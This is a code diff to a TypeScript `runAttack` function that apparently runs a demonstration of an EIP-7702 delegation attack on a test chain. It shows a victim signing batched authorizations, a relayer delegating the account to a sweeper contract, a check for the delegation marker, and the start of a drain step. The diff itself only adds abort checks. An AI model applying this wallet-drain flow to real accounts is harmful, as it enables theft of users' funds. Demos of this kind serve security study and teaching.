@@ -30,8 +30,9 @@ function env(k: string) {
  * repeatable. The relayer pays gas and broadcasts; the attacker + contracts
  * come from `npm run setup` / deploy.
  */
-export async function runAttack(emit: Emit) {
+export async function runAttack(emit: Emit, signal?: AbortSignal) {
   const E = (e: Parameters<Emit>[0]) => emit({ t: Date.now(), ...e });
+  const abortIf = () => { if (signal?.aborted) throw new DOMException("aborted", "AbortError"); };
 
   const chain = getChain();
   const cfg = getConfig(); // current run's addresses (swapped by /api/reset)
@@ -57,6 +58,7 @@ export async function runAttack(emit: Emit) {
 
   const before = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
   E({ step: "before", msg: "Victim balance before attack", victimTUSD: formatUnits(before, DEC), attackerTUSD: "0" });
+  abortIf();
 
   // 1 — sign 50 authorizations at consecutive nonces
   const start = await pub.getTransactionCount({ address: victim.address });
@@ -68,6 +70,7 @@ export async function runAttack(emit: Emit) {
     await sleep(PACE);
   }
   E({ step: "sign-done", msg: `All ${NUM_AUTHS} authorizations signed. Exactly one (nonce ${start}) matches and takes effect.`, matchingNonce: start });
+  abortIf();
   await sleep(PACE * 14);
 
   // 2 — relayer broadcasts the delegation (victim nonce only advances via the authorization)
@@ -81,6 +84,7 @@ export async function runAttack(emit: Emit) {
   const delegated = !!code && code.toLowerCase().startsWith("0xef0100");
   E({ step: "verify", msg: delegated ? "Victim account is now DELEGATED to the sweeper (0xef0100 marker present)" : "No delegation marker found", delegated, code });
   if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
+  abortIf();
   await sleep(PACE * 14);
 
   // 3 — drain
